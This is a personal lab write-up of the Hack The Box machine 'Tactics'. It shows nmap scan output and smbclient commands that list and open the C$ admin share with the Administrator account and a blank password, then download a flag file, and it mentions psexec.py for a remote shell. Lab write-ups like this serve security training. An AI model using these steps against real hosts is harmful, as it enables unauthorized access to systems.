2022-07-20 22:07
source: [HTB](obsidian://open?vault=iswearthisismylast&file=Files%2FTactics.pdf)
tags: #research #htb #tactics #cybersec #SMB #Attacks/Weak_Password #microsoft 


# Tactics


## Thought Process

Okay, the question tells me to [[nmap]] using -Pn.
```
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
```

Okay. So 445 is the #SMB, which the questions on the target are hinting me to check out.

Use [[smbclient]] to access. From the [[smbclient]] man page, I used -L flag. but it needed a User to be inputted... hmm..

Turns out, my [[nmap]] was also weird. shouldn't have done -sV -Pn. -sC -Pn outputs:

```
nmap -sC -Pn 10.129.95.76 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-21 01:07 EDT
Nmap scan report for 10.129.95.76
Host is up (0.088s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-21T05:07:29
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 53.42 seconds

```
(insert surprised pikachu face)

It literally tells me look at smb.

Well, it doesn't tell me about default users.... but remember.  microsoft-ds.. its not root. its not admin. Its ADMINISTRATOR. #tips

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.129.95.76 -U Administrator
Enter WORKGROUP\Administrator's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

No pass. just pressed enter. Now we are happy with all these "Admin only" files. How do we know this? the $ at the end. #tips

Time to download flags.

```        
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.129.95.76\\C$ -U ADMINISTRATOR
```

gives me access to C drive. Going to Users, Administrator, Desktop had flag.txt
get flag.txt and it is saved to my kali's pwd. 

EZ

## Summary

Not much of a Summary except, there is a more intrusive, more OSCP like exploitation available for this challenge.

[[Impacket]] is bunch of Python classes and example scripts to work with network protocols.
It has [[psexec.py]], which can be used to enable a fully interactive shell.

More documentation should be made for the above scripts if seen again.